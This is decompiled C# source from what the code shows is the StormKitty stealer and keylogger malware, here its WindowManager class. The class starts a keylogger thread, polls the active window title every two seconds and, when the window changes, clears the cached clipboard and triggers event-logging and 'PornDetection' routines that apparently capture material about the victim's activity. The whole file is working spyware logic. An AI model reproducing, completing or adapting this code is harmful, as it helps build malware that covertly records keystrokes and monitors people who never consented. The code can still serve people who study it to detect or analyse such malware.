using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Keylogger;

namespace StormKitty
{
	// Token: 0x0200004F RID: 79
	internal sealed class WindowManager
	{
		// Token: 0x06000145 RID: 325
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000146 RID: 326
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		// Token: 0x06000147 RID: 327 RVA: 0x0000B4A8 File Offset: 0x000096A8
		private static string GetActiveWindowTitle()
		{
			string result;
			try
			{
				uint processId;
				WindowManager.GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out processId);
				Process processById = Process.GetProcessById((int)processId);
				string text = processById.MainWindowTitle;
				if (string.IsNullOrWhiteSpace(text))
				{
					text = processById.ProcessName;
				}
				result = text;
			}
			catch (Exception)
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000148 RID: 328 RVA: 0x0000B500 File Offset: 0x00009700
		private static void Run()
		{
			Keylogger.MainThread.Start();
			string b = "";
			for (;;)
			{
				Thread.Sleep(2000);
				WindowManager.ActiveWindow = WindowManager.GetActiveWindowTitle();
				if (WindowManager.ActiveWindow != b)
				{
					b = WindowManager.ActiveWindow;
					ClipboardManager.PrevClipboard = "";
					foreach (Action action in WindowManager.functions)
					{
						action();
					}
				}
			}
		}

		// Token: 0x0400008E RID: 142
		public static string ActiveWindow;

		// Token: 0x0400008F RID: 143
		public static Thread MainThread = new Thread(new ThreadStart(WindowManager.Run));

		// Token: 0x04000090 RID: 144
		private static List<Action> functions = new List<Action>
		{
			new Action(EventManager.Action),
			new Action(PornDetection.Action)
		};
	}
}
